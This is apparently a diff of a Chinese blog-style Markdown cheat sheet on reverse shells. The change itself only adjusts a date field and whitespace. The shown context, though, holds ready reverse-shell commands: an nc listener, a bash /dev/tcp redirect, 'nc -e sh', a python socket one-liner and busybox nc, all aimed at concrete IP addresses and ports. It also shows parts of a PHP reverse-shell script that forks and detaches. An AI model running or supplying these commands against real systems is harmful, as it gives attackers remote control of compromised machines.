@@ -1,9 +1,10 @@
 ---
 title: "反向shell"
-pubDatetime: 2025-03-08T12:13:00.000+08:00
+modDatetime: 2025-03-08T12:13:00.000+08:00
 description: "常见反弹 shell 命令、busybox 与不同环境下的连接方式"
 tags: ["others"]
 ---
+
 提供一个面向用户的命令接口
 
 各种反向shell生成：
@@ -14,17 +15,21 @@ https://www.revshells.com/
 典型bash反弹shell
 
 在攻击者端运行
+
 ```
 nc -lvvp <port>
 ```
 
 再服务端上运行
+
 ```bash
 /bin/bash -i >& /dev/tcp/121.37.168.204/7777  0>&1
 ```
+
 即把标准输出和错误输出重定向到ip/port中，
 然后把标准输入重定向到标准输出中，这样标准输入也重定向到ip/port中了
 或
+
 ```bash
 nc 121.37.168.204 7777 -e sh
 ```
@@ -34,6 +39,7 @@ python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("121.37.168.20
 ```
 
 ## busybox
+
 ```
 busybox nc 178.128.91.191 4404 -e sh
 ```
@@ -64,12 +70,12 @@ $debug = 0;
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
-	
+
 	if ($pid == -1) {
 		printit("ERROR: Can't fork");
 		exit(1);
 	}
-	
+
 	if ($pid) {
 		exit(0);  // Parent exits
 	}
@@ -186,5 +192,5 @@ function printit ($string) {
 	}
 }
 
-?> 
+?>
 ```
